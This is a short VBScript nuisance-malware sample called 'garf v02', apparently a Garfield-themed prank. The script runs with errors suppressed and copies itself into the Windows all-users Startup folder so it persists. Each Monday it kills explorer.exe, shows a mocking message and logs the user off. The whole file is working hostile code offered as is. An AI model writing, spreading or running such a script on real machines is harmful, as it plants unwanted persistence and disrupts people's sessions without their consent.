'garf v02 by YM2612
'this would've been FUCKING easier if i just used python
Const q = """"
Dim schelle
On Error Resume Next
Set schelle = CreateObject("WScript.Shell")
schelle.Run("cmd /C copy " & q & WScript.ScriptFullName & q & " " & q & "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\" & q)

If Weekday(Now()) = vbMonday Then
	schelle.Run("cmd /C taskkill /f /im explorer.exe")
	msg = msgBox("Today is a monday. Unfortunately for you, however, I hate mondays. I'm going to have to log you off. Make yourself some lasaga.",48,"garf")
	schelle.Run("cmd /C shutdown /l")
End If
